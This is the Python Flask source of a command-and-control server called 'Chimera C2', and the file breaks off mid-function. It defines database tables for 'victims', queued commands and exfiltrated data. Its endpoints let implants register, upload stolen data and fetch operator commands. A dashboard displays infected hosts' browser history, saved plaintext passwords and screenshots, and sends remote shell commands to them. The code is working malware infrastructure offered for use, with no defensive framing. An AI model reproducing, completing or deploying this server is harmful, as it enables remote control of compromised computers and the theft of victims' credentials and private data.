from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
import json
import secrets
import logging

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ============================================
# MODELS
# ============================================

class Victim(db.Model):
    __tablename__ = 'victims'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), unique=True, nullable=False)
    hostname = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    mac = db.Column(db.String(50))
    os = db.Column(db.String(100))
    os_version = db.Column(db.String(200))
    architecture = db.Column(db.String(50))
    cpu = db.Column(db.String(100))
    memory = db.Column(db.String(50))
    disk = db.Column(db.String(200))
    username = db.Column(db.String(100))
    domain = db.Column(db.String(100))
    first_seen = db.Column(db.DateTime, default=datetime.now)
    last_seen = db.Column(db.DateTime, default=datetime.now)
    status = db.Column(db.String(50), default='active')

class Command(db.Model):
    __tablename__ = 'commands'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), nullable=False)
    command = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(50), default='pending')
    result = db.Column(db.Text)
    issued_at = db.Column(db.DateTime, default=datetime.now)
    executed_at = db.Column(db.DateTime)

class CollectedData(db.Model):
    __tablename__ = 'collected_data'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), nullable=False)
    data_type = db.Column(db.String(50))
    content = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.now)

with app.app_context():
    db.create_all()
    logging.info("Database initialized")

# ============================================
# HTML DASHBOARD - IMPROVED
# ============================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chimera C2 Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0e1a;
            color: #e0e0e0;
            padding: 20px;
            min-height: 100vh;
        }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0e1a; }
        ::-webkit-scrollbar-thumb { background: #2a2f4a; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #00ff88; }

        /* Header */
        .header {
            background: linear-gradient(135deg, #1a1f3a 0%, #0d1225 100%);
            padding: 20px 30px;
            border-radius: 16px;
            border: 1px solid #2a2f4a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 25px;
            box-shadow: 0 4px 30px rgba(0,0,0,0.3);
        }
        .header-left h1 {
            font-size: 26px;
            font-weight: 800;
            background: linear-gradient(90deg, #00ff88, #00cc66);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header-left .subtitle { color: #666; font-size: 13px; margin-top: 4px; }
        .header-stats {
            display: flex;
            gap: 25px;
            flex-wrap: wrap;
        }
        .stat-item { text-align: center; }
        .stat-item .number {
            font-size: 24px;
            font-weight: 700;
            color: #00ff88;
        }
        .stat-item .label {
            font-size: 11px;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .stat-item .number.pending { color: #ffd700; }
        .stat-item .number.active { color: #00ff88; }
        .stat-item .number.data { color: #00b4ff; }

        .header-actions {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .btn-refresh {
            background: #00ff88;
            color: #0a0e1a;
            border: none;
            padding: 10px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 700;
            font-size: 14px;
            transition: all 0.3s;
        }
        .btn-refresh:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,255,136,0.3); }
        .refresh-time { color: #555; font-size: 12px; }

        /* Victim Cards */
        .victim-card {
            background: linear-gradient(135deg, #1a1f3a 0%, #0d1225 100%);
            border-radius: 16px;
            padding: 20px 25px;
            margin: 12px 0;
            border: 1px solid #2a2f4a;
            transition: all 0.3s;
        }
        .victim-card:hover { border-color: #00ff88; box-shadow: 0 0 30px rgba(0,255,136,0.05); }

        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 12px;
        }
        .victim-id {
            font-size: 18px;
            font-weight: 700;
            color: #00ff88;
        }
        .victim-status {
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            background: rgba(0,255,136,0.15);
            color: #00ff88;
            border: 1px solid rgba(0,255,136,0.3);
        }
        .victim-status.offline {
            background: rgba(255,0,68,0.15);
            color: #ff0044;
            border-color: rgba(255,0,68,0.3);
        }

        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 6px 20px;
            margin: 8px 0;
            padding: 10px 0;
            border-top: 1px solid #1a1f3a;
            border-bottom: 1px solid #1a1f3a;
        }
        .victim-details .detail {
            font-size: 13px;
            color: #888;
        }
        .victim-details .detail span {
            color: #e0e0e0;
            font-weight: 500;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 5px;
            margin: 12px 0 10px 0;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 6px 16px;
            background: #0a0e1a;
            border: 1px solid #2a2f4a;
            border-radius: 6px;
            color: #888;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            transition: 0.3s;
        }
        .tab-btn:hover { background: #1a1f3a; color: #e0e0e0; }
        .tab-btn.active {
            background: #00ff88;
            color: #0a0e1a;
            border-color: #00ff88;
        }

        .tab-content {
            display: none;
            background: #0a0e1a;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #1a1f3a;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 5px;
        }
        .tab-content.active { display: block; }

        /* Data Display */
        .data-item {
            padding: 6px 0;
            border-bottom: 1px solid #1a1f3a;
            font-size: 12px;
            color: #aaa;
            display: flex;
            gap: 10px;
        }
        .data-item .label { color: #666; min-width: 100px; font-weight: 500; }
        .data-item .value { color: #e0e0e0; word-break: break-all; }

        .data-item .value.url { color: #00b4ff; }
        .data-item .value.title { color: #ffd700; }

        /* Screenshot */
        .screenshot-container {
            text-align: center;
            margin: 5px 0;
        }
        .screenshot-img {
            max-width: 100%;
            max-height: 450px;
            border-radius: 8px;
            border: 1px solid #2a2f4a;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
        }
        .screenshot-info {
            color: #666;
            font-size: 11px;
            margin-top: 5px;
        }

        /* Command Box */
        .command-box {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 10px 0;
        }
        .command-box input {
            flex: 1;
            min-width: 200px;
            padding: 10px 16px;
            background: #0a0e1a;
            border: 1px solid #2a2f4a;
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 14px;
            transition: 0.3s;
        }
        .command-box input:focus {
            outline: none;
            border-color: #00ff88;
        }
        .command-box input::placeholder { color: #444; }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            font-size: 13px;
            transition: all 0.3s;
        }
        .btn:hover { transform: scale(1.02); }
        .btn-go { background: #00ff88; color: #0a0e1a; }
        .btn-go:hover { box-shadow: 0 0 20px rgba(0,255,136,0.2); }
        .btn-data { background: #2a2f4a; color: #fff; }
        .btn-data:hover { background: #3a3f5a; }
        .btn-screenshot {
            background: linear-gradient(135deg, #ffd700, #ffaa00);
            color: #0a0e1a;
        }
        .btn-screenshot:hover { box-shadow: 0 0 20px rgba(255,215,0,0.2); }
        .btn-clear { background: #333; color: #fff; }

        .result {
            padding: 10px 14px;
            margin-top: 8px;
            border-radius: 8px;
            font-size: 13px;
            background: #0a0e1a;
            border-left: 3px solid;
            display: none;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
        }
        .result.visible { display: block; }
        .result.success { border-color: #00ff88; color: #00ff88; }
        .result.pending { border-color: #ffd700; color: #ffd700; }
        .result.error { border-color: #ff0044; color: #ff0044; }

        /* Live Stream */
        .live-stream {
            background: linear-gradient(135deg, #1a1f3a 0%, #0d1225 100%);
            border-radius: 16px;
            padding: 15px 20px;
            margin-top: 25px;
            border: 1px solid #2a2f4a;
            max-height: 150px;
            overflow-y: auto;
        }
        .live-stream .title {
            color: #666;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        .live-entry {
            padding: 3px 10px;
            border-bottom: 1px solid #1a1f3a;
            font-size: 12px;
            color: #888;
            display: flex;
            gap: 15px;
            align-items: center;
        }
        .live-entry .time { color: #444; font-size: 10px; min-width: 70px; }
        .live-entry .type {
            color: #ffd700;
            font-weight: 600;
            min-width: 80px;
            font-size: 11px;
        }
        .live-entry .type.screenshot { color: #ffaa00; }
        .live-entry .type.command { color: #00b4ff; }
        .live-entry .type.result { color: #00ff88; }
        .live-entry .type.system { color: #888; }

        .debug-info {
            color: #555;
            font-size: 12px;
            margin-top: 15px;
            padding: 10px;
            background: #0a0e1a;
            border-radius: 8px;
            border: 1px solid #1a1f3a;
        }

        .no-victims {
            text-align: center;
            padding: 60px 20px;
            color: #444;
        }
        .no-victims .icon { font-size: 48px; margin-bottom: 15px; }
        .no-victims h3 { color: #555; margin-bottom: 5px; }
        .no-victims p { color: #333; }

        .badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
        }
        .badge-history { background: #00b4ff22; color: #00b4ff; border: 1px solid #00b4ff33; }
        .badge-password { background: #ff004422; color: #ff0044; border: 1px solid #ff004433; }
        .badge-screenshot { background: #ffd70022; color: #ffd700; border: 1px solid #ffd70033; }
        .badge-system { background: #00ff8822; color: #00ff88; border: 1px solid #00ff8833; }

        .count-badge {
            background: #2a2f4a;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 11px;
            color: #888;
            margin-left: 5px;
        }

        @media (max-width: 768px) {
            .header { flex-direction: column; text-align: center; }
            .header-stats { justify-content: center; }
            .header-actions { width: 100%; justify-content: center; }
            .victim-details { grid-template-columns: 1fr; }
            .command-box { flex-direction: column; }
            .command-box input { width: 100%; }
            .tabs { justify-content: center; }
        }
    </style>
</head>
<body>

<div class="header">
    <div class="header-left">
        <h1>🎯 Chimera C2</h1>
        <div class="subtitle">Command & Control Dashboard</div>
    </div>
    <div class="header-stats">
        <div class="stat-item">
            <div class="number" id="total">0</div>
            <div class="label">Total Victims</div>
        </div>
        <div class="stat-item">
            <div class="number active" id="active">0</div>
            <div class="label">Active</div>
        </div>
        <div class="stat-item">
            <div class="number pending" id="pending">0</div>
            <div class="label">Pending</div>
        </div>
        <div class="stat-item">
            <div class="number data" id="dataCount">0</div>
            <div class="label">Data Points</div>
        </div>
    </div>
    <div class="header-actions">
        <button class="btn-refresh" onclick="refresh()">🔄 Refresh</button>
        <span class="refresh-time" id="refreshTime">Never</span>
    </div>
</div>

<div id="victimsContainer"></div>

<div class="live-stream" id="liveStream">
    <div class="title">📡 Live Events</div>
    <div class="live-entry" style="color:#333;">Waiting for events...</div>
</div>

<div class="debug-info" id="debugInfo">💡 Click Refresh to load data</div>

<script>
// ============================================
// STATE
// ============================================
let victimsData = [];
let currentTab = {};

// ============================================
// REFRESH
// ============================================
function refresh() {
    document.getElementById('debugInfo').textContent = '🔄 Loading...';
    document.getElementById('refreshTime').textContent = new Date().toLocaleTimeString();

    Promise.all([
        fetch('/api/victims').then(r => r.json()),
        fetch('/api/stats').then(r => r.json())
    ])
    .then(([victims, stats]) => {
        victimsData = victims.victims || [];
        updateStats(victimsData, stats);
        renderVictims(victimsData);
        document.getElementById('debugInfo').textContent = '✅ Updated at ' + new Date().toLocaleTimeString();
        addLiveEntry('system', '🔄 Data refreshed');
    })
    .catch(e => {
        document.getElementById('debugInfo').textContent = '❌ Error: ' + e.message;
    });
}

function updateStats(victims, stats) {
    document.getElementById('total').textContent = victims.length;
    document.getElementById('active').textContent = victims.filter(v => v.status === 'active').length;
    document.getElementById('pending').textContent = stats.pending_commands || 0;
    document.getElementById('dataCount').textContent = stats.total_data || 0;
}

function renderVictims(victims) {
    const container = document.getElementById('victimsContainer');
    if (victims.length === 0) {
        container.innerHTML = `
            <div class="no-victims">
                <div class="icon">🕵️</div>
                <h3>No Victims Connected</h3>
                <p>Waiting for payloads to call home...</p>
            </div>
        `;
        return;
    }

    container.innerHTML = victims.map(v => {
        const isActive = v.status === 'active';
        const victimId = v.id;
        currentTab[victimId] = 'info';
        return `
            <div class="victim-card" id="card_${victimId}">
                <div class="victim-header">
                    <span class="victim-id">🖥️ ${victimId}</span>
                    <span class="victim-status ${isActive ? '' : 'offline'}">${isActive ? '● ONLINE' : '● OFFLINE'}</span>
                </div>
                <div class="victim-details" id="details_${victimId}">
                    <div class="detail">🏷️ Hostname: <span>${v.hostname || 'Unknown'}</span></div>
                    <div class="detail">🌐 IP: <span>${v.ip || 'Unknown'}</span></div>
                    <div class="detail">📶 MAC: <span>${v.mac || 'N/A'}</span></div>
                    <div class="detail">🖥️ OS: <span>${v.os || 'Unknown'}</span></div>
                    <div class="detail">🔧 Arch: <span>${v.architecture || 'Unknown'}</span></div>
                    <div class="detail">💾 CPU: <span>${v.cpu || 'Unknown'}</span></div>
                    <div class="detail">🧠 RAM: <span>${v.memory || 'Unknown'}</span></div>
                    <div class="detail">👤 User: <span>${v.username || 'Unknown'}</span></div>
                    <div class="detail">🏢 Domain: <span>${v.domain || 'Unknown'}</span></div>
                    <div class="detail" style="grid-column:1/-1;color:#444;font-size:11px;">
                        🕐 First: ${formatDate(v.first_seen)} | Last: ${formatDate(v.last_seen)}
                    </div>
                </div>

                <div class="command-box">
                    <input type="text" id="cmd_${victimId}" placeholder="Enter command..." onkeypress="if(event.key==='Enter') executeCommand('${victimId}')">
                    <button class="btn btn-go" onclick="executeCommand('${victimId}')">▶ Run</button>
                    <button class="btn btn-data" onclick="loadData('${victimId}')">📁 Data</button>
                    <button class="btn btn-screenshot" onclick="loadScreenshot('${victimId}')">📸 Screenshot</button>
                </div>

                <div id="result_${victimId}" class="result"></div>

                <!-- Tabs -->
                <div class="tabs" id="tabs_${victimId}">
                    <button class="tab-btn active" data-tab="info" onclick="switchTab('${victimId}','info')">📋 Info</button>
                    <button class="tab-btn" data-tab="system" onclick="switchTab('${victimId}','system')">🖥️ System</button>
                    <button class="tab-btn" data-tab="browser" onclick="switchTab('${victimId}','browser')">🌐 Browser</button>
                    <button class="tab-btn" data-tab="screenshots" onclick="switchTab('${victimId}','screenshots')">📸 Screenshots</button>
                    <button class="tab-btn" data-tab="commands" onclick="switchTab('${victimId}','commands')">⌨️ Commands</button>
                </div>

                <div id="tab_content_${victimId}">
                    <div class="tab-content active" id="tab_info_${victimId}">
                        <div style="color:#666;font-size:13px;padding:10px;text-align:center;">
                            📋 Click "Data" or "Screenshot" to load information
                        </div>
                    </div>
                    <div class="tab-content" id="tab_system_${victimId}">
                        <div style="color:#666;font-size:13px;padding:10px;text-align:center;">
                            🖥️ Click "Data" to load system information
                        </div>
                    </div>
                    <div class="tab-content" id="tab_browser_${victimId}">
                        <div style="color:#666;font-size:13px;padding:10px;text-align:center;">
                            🌐 Click "Data" to load browser history
                        </div>
                    </div>
                    <div class="tab-content" id="tab_screenshots_${victimId}">
                        <div style="color:#666;font-size:13px;padding:10px;text-align:center;">
                            📸 Click "Screenshot" to load latest screenshot
                        </div>
                    </div>
                    <div class="tab-content" id="tab_commands_${victimId}">
                        <div style="color:#666;font-size:13px;padding:10px;text-align:center;">
                            ⌨️ Commands will appear here after execution
                        </div>
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

// ============================================
// TAB SWITCHING
// ============================================
function switchTab(victimId, tabName) {
    currentTab[victimId] = tabName;
    
    // Update tab buttons
    const tabs = document.getElementById(`tabs_${victimId}`).querySelectorAll('.tab-btn');
    tabs.forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.tab === tabName) btn.classList.add('active');
    });
    
    // Update tab content
    const tabContents = document.getElementById(`tab_content_${victimId}`).querySelectorAll('.tab-content');
    tabContents.forEach(content => {
        content.classList.remove('active');
        if (content.id === `tab_${tabName}_${victimId}`) content.classList.add('active');
    });
}

// ============================================
// LOAD DATA
// ============================================
function loadData(victimId) {
    const systemTab = document.getElementById(`tab_system_${victimId}`);
    const browserTab = document.getElementById(`tab_browser_${victimId}`);
    
    systemTab.innerHTML = '🔄 Loading system data...';
    browserTab.innerHTML = '🔄 Loading browser data...';
    
    fetch(`/api/victim/${victimId}`)
        .then(r => r.json())
        .then(data => {
            const entries = data.data || [];
            
            // System Info
            const systemData = entries.filter(d => d.type === 'system_info');
            if (systemData.length > 0) {
                const latest = systemData[0];
                const content = latest.content;
                systemTab.innerHTML = `
                    <div class="data-item"><span class="label">Hostname</span><span class="value">${content.hostname || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">IP Address</span><span class="value">${content.ip || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">MAC Address</span><span class="value">${content.mac || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">Operating System</span><span class="value">${content.os || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">OS Version</span><span class="value">${content.os_version || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">Architecture</span><span class="value">${content.architecture || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">CPU</span><span class="value">${content.cpu || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">CPU Cores</span><span class="value">${content.cpu_cores || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">CPU Usage</span><span class="value">${content.cpu_usage || '0'}%</span></div>
                    <div class="data-item"><span class="label">Memory (RAM)</span><span class="value">${content.memory || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">Username</span><span class="value">${content.username || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">Domain</span><span class="value">${content.domain || 'Unknown'}</span></div>
                    <div class="data-item"><span class="label">Disks</span><span class="value">${formatDisks(content.disks)}</span></div>
                    <div style="color:#444;font-size:11px;margin-top:10px;">🕐 ${formatDate(latest.timestamp)}</div>
                `;
            } else {
                systemTab.innerHTML = '<div style="color:#666;padding:10px;">No system data available</div>';
            }
            
            // Browser Data
            const browserData = entries.filter(d => d.type === 'browser_data');
            if (browserData.length > 0) {
                const latest = browserData[0];
                const content = latest.content;
                let html = '';
                
                // History
                if (content.history && content.history.length > 0) {
                    html += `<div style="color:#00b4ff;font-weight:600;margin-bottom:8px;">📜 History (${content.history.length} entries)</div>`;
                    content.history.slice(0, 20).forEach(h => {
                        html += `
                            <div class="data-item">
                                <span class="label">${h.browser || 'Browser'}</span>
                                <span class="value">
                                    <div class="value title">${h.title || 'Untitled'}</div>
                                    <div class="value url" style="font-size:11px;color:#00b4ff;">${h.url || ''}</div>
                                    <div style="font-size:10px;color:#444;">${formatTimestamp(h.timestamp)}</div>
                                </span>
                            </div>
                        `;
                    });
                    if (content.history.length > 20) {
                        html += `<div style="color:#444;font-size:11px;padding:5px;">... and ${content.history.length - 20} more</div>`;
                    }
                } else {
                    html += `<div style="color:#666;padding:5px;">No browser history found</div>`;
                }
                
                // Passwords
                if (content.passwords && content.passwords.length > 0) {
                    html += `<div style="color:#ff0044;font-weight:600;margin:10px 0 8px 0;">🔑 Passwords (${content.passwords.length} found)</div>`;
                    content.passwords.slice(0, 10).forEach(p => {
                        html += `
                            <div class="data-item">
                                <span class="label">${p.browser || 'Browser'}</span>
                                <span class="value">
                                    <div>🔗 ${p.url || ''}</div>
                                    <div>👤 ${p.username || ''}</div>
                                    <div style="color:#ff0044;">🔒 ${p.password || ''}</div>
                                </span>
                            </div>
                        `;
                    });
                }
                
                browserTab.innerHTML = html || '<div style="color:#666;padding:10px;">No browser data available</div>';
            } else {
                browserTab.innerHTML = '<div style="color:#666;padding:10px;">No browser data available</div>';
            }
            
            // Commands
            const commandsTab = document.getElementById(`tab_commands_${victimId}`);
            const cmds = data.commands || [];
            if (cmds.length > 0) {
                commandsTab.innerHTML = cmds.map(c => `
                    <div class="data-item">
                        <span class="label">${c.status === 'executed' ? '✅' : '⏳'}</span>
                        <span class="value">
                            <div style="color:#ffd700;">📝 ${c.command}</div>
                            <div style="color:#888;font-size:11px;">${c.status} | ${formatDate(c.issued_at)}</div>
                            ${c.result ? `<div style="color:#00ff88;font-size:12px;font-family:monospace;max-height:100px;overflow-y:auto;">${c.result}</div>` : ''}
                        </span>
                    </div>
                `).join('');
            } else {
                commandsTab.innerHTML = '<div style="color:#666;padding:10px;">No commands executed yet</div>';
            }
            
            // Auto-switch to system tab
            switchTab(victimId, 'system');
            addLiveEntry('data', `📁 Data loaded for ${victimId}`);
        })
        .catch(e => {
            systemTab.innerHTML = '❌ Error loading data';
            browserTab.innerHTML = '❌ Error loading data';
        });
}

// ============================================
// LOAD SCREENSHOT
// ============================================
function loadScreenshot(victimId) {
    const tab = document.getElementById(`tab_screenshots_${victimId}`);
    tab.innerHTML = '🔄 Loading latest screenshot...';
    
    fetch(`/api/victim/${victimId}`)
        .then(r => r.json())
        .then(data => {
            const entries = data.data || [];
            const screenshots = entries.filter(d => d.type === 'screenshot');
            
            if (screenshots.length > 0) {
                // Show only the latest screenshot
                const latest = screenshots[0];
                const img = latest.content.image;
                const size = Math.round(latest.content.size / 1024);
                const timestamp = formatDate(latest.timestamp);
                
                tab.innerHTML = `
                    <div style="color:#888;font-size:12px;margin-bottom:8px;">
                        📸 Screenshots: <span style="color:#ffd700;">${screenshots.length}</span> total
                        <span style="margin-left:15px;">Latest: ${timestamp}</span>
                        <span style="margin-left:15px;">Size: ${size} KB</span>
                    </div>
                    <div class="screenshot-container">
                        <img src="data:image/png;base64,${img}" class="screenshot-img" 
                             onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'color:#ff0044;padding:20px;\\'>❌ Failed to load image</div>'">
                    </div>
                    <div class="screenshot-info">
                        📸 Screenshot captured at ${timestamp}
                    </div>
                `;
                
                // Switch to screenshots tab
                switchTab(victimId, 'screenshots');
                addLiveEntry('screenshot', `📸 Screenshot loaded for ${victimId}`);
            } else {
                tab.innerHTML = '<div style="color:#666;padding:20px;text-align:center;">📸 No screenshots available</div>';
            }
        })
        .catch(e => {
            tab.innerHTML = '❌ Error loading screenshot: ' + e.message;
        });
}

// ============================================
// EXECUTE COMMAND
// ============================================
function executeCommand(victimId) {
    const cmd = document.getElementById(`cmd_${victimId}`).value.trim();
    if (!cmd) { alert('Enter a command'); return; }

    const resultDiv = document.getElementById(`result_${victimId}`);
    resultDiv.textContent = '⏳ Sending command...';
    resultDiv.className = 'result visible pending';

    fetch('/api/send_command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ victim_id: victimId, command: cmd })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'queued') {
            resultDiv.textContent = '✅ Command sent! Waiting for execution...';
            resultDiv.className = 'result visible success';
            document.getElementById(`cmd_${victimId}`).value = '';
            addLiveEntry('command', `📝 Command sent: ${cmd}`);
            setTimeout(() => checkResult(victimId, data.command_id), 8000);
        } else {
            resultDiv.textContent = '❌ Error: ' + (data.message || 'Unknown');
            resultDiv.className = 'result visible error';
        }
    })
    .catch(e => {
        resultDiv.textContent = '❌ Error: ' + e.message;
        resultDiv.className = 'result visible error';
    });
}

function checkResult(victimId, cmdId) {
    fetch(`/api/victim/${victimId}`)
        .then(r => r.json())
        .then(data => {
            const cmd = (data.commands || []).find(c => c.id === cmdId);
            const resultDiv = document.getElementById(`result_${victimId}`);
            if (cmd && cmd.status === 'executed') {
                let output = cmd.result || 'No output';
                try { output = JSON.parse(output).result || output; } catch(e) {}
                resultDiv.textContent = '✅ Result: ' + output;
                resultDiv.className = 'result visible success';
                addLiveEntry('result', '✅ Command executed: ' + cmd.command);
                
                // Update commands tab
                const commandsTab = document.getElementById(`tab_commands_${victimId}`);
                loadData(victimId);
            } else if (cmd && cmd.status === 'pending') {
                resultDiv.textContent = '⏳ Still pending... retrying in 5s';
                resultDiv.className = 'result visible pending';
                setTimeout(() => checkResult(victimId, cmdId), 5000);
            } else {
                resultDiv.textContent = '⚠️ No result yet';
                resultDiv.className = 'result visible pending';
            }
        });
}

// ============================================
// LIVE STREAM
// ============================================
function addLiveEntry(type, message) {
    const stream = document.getElementById('liveStream');
    if (stream.children.length === 1 && stream.children[0].textContent.includes('Waiting')) {
        stream.innerHTML = '';
    }
    const entry = document.createElement('div');
    entry.className = 'live-entry';
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `
        <span class="time">${time}</span>
        <span class="type ${type}">[${type}]</span>
        <span>${message}</span>
    `;
    stream.prepend(entry);
    while (stream.children.length > 30) {
        stream.removeChild(stream.lastChild);
    }
}

// ============================================
// UTILITY
// ============================================
function formatDate(dateStr) {
    if (!dateStr) return 'Never';
    try {
        return new Date(dateStr).toLocaleString();
    } catch {
        return dateStr;
    }
}

function formatTimestamp(ts) {
    if (!ts) return 'Unknown';
    try {
        // Chrome timestamp (microseconds since 1601)
        if (ts.toString().length > 13) {
            const date = new Date(1601, 0, 1);
            date.setMilliseconds(ts / 1000);
            return date.toLocaleString();
        }
        return new Date(ts).toLocaleString();
    } catch {
        return ts.toString();
    }
}

function formatDisks(disks) {
    if (!disks || disks.length === 0) return 'N/A';
    return disks.map(d => `${d.mount}: ${d.free} free / ${d.total} total`).join(' | ');
}

// ============================================
// AUTO REFRESH
// ============================================
function autoRefresh() {
    fetch('/api/victims')
        .then(r => r.json())
        .then(data => {
            const victims = data.victims || [];
            fetch('/api/stats')
                .then(r => r.json())
                .then(stats => {
                    document.getElementById('total').textContent = victims.length;
                    document.getElementById('active').textContent = victims.filter(v => v.status === 'active').length;
                    document.getElementById('pending').textContent = stats.pending_commands || 0;
                    document.getElementById('dataCount').textContent = stats.total_data || 0;
                });
        })
        .catch(() => {});
}

// ============================================
// INIT
// ============================================
refresh();
setInterval(autoRefresh, 5000);

console.log('🎯 Chimera C2 Dashboard loaded');
</script>
</body>
</html>
'''

# ============================================
# ROUTES
# ============================================

@app.route('/')
@app.route('/dashboard')
def dashboard():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.json
        vid = data.get('victim_id')
        if not vid:
            return jsonify({'status': 'error'}), 400
        
        v = Victim.query.filter_by(victim_id=vid).first()
        if v:
            v.last_seen = datetime.now()
            v.ip = data.get('ip', v.ip)
            v.mac = data.get('mac', v.mac)
            v.hostname = data.get('hostname', v.hostname)
            v.os = data.get('os', v.os)
            v.os_version = data.get('os_version', v.os_version)
            v.architecture = data.get('architecture', v.architecture)
            v.cpu = data.get('cpu', v.cpu)
            v.memory = data.get('memory', v.memory)
            v.disk = data.get('disk', v.disk)
            v.username = data.get('username', v.username)
            v.domain = data.get('domain', v.domain)
            v.status = 'active'
        else:
            v = Victim(
                victim_id=vid,
                hostname=data.get('hostname', 'Unknown'),
                ip=data.get('ip', 'Unknown'),
                mac=data.get('mac', 'Unknown'),
                os=data.get('os', 'Unknown'),
                os_version=data.get('os_version', 'Unknown'),
                architecture=data.get('architecture', 'Unknown'),
                cpu=data.get('cpu', 'Unknown'),
                memory=data.get('memory', 'Unknown'),
                disk=data.get('disk', 'Unknown'),
                username=data.get('username', 'Unknown'),
                domain=data.get('domain', 'Unknown'),
                status='active'
            )
            db.session.add(v)
        
        db.session.commit()
        return jsonify({'status': 'registered'})
    except Exception as e:
        logging.error(f"Register error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        vid = data.get('victim_id')
        data_type = data.get('type')
        
        if not vid:
            return jsonify({'status': 'error'}), 400
        
        v = Victim.query.filter_by(victim_id=vid).first()
        if v:
            v.last_seen = datetime.now()
            db.session.commit()
        
        c = CollectedData(
            victim_id=vid,
            data_type=data_type,
            content=json.dumps(data.get('content', {}), default=str),
            timestamp=datetime.now()
        )
        db.session.add(c)
        db.session.commit()
        
        logging.info(f"Data from {vid}: {data_type}")
        return jsonify({'status': 'received'})
    except Exception as e:
        logging.error(f"Collect error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/get_command', methods=['POST'])
def get_command():
    try:
        data = request.json
        vid = data.get('victim_id')
        if not vid:
            return jsonify({'status': 'error'}), 400
        
        cmd = Command.query.filter_by(victim_id=vid, status='pending').first()
        if cmd:
            return jsonify({'has_command': True, 'command': cmd.command, 'command_id': cmd.id})
        return jsonify({'has_command': False})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command_result', methods=['POST'])
def command_result():
    try:
        data = request.json
        cmd_id = data.get('command_id')
        result = data.get('result')
        
        cmd = Command.query.get(cmd_id)
        if cmd:
            cmd.status = 'executed'
            cmd.result = json.dumps(result, default=str) if result else '{}'
            cmd.executed_at = datetime.now()
            db.session.commit()
            logging.info(f"Command {cmd_id} executed")
        
        return jsonify({'status': 'updated'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    try:
        data = request.json
        vid = data.get('victim_id')
        cmd_text = data.get('command')
        
        if not vid or not cmd_text:
            return jsonify({'status': 'error'}), 400
        
        cmd = Command(victim_id=vid, command=cmd_text, status='pending')
        db.session.add(cmd)
        db.session.commit()
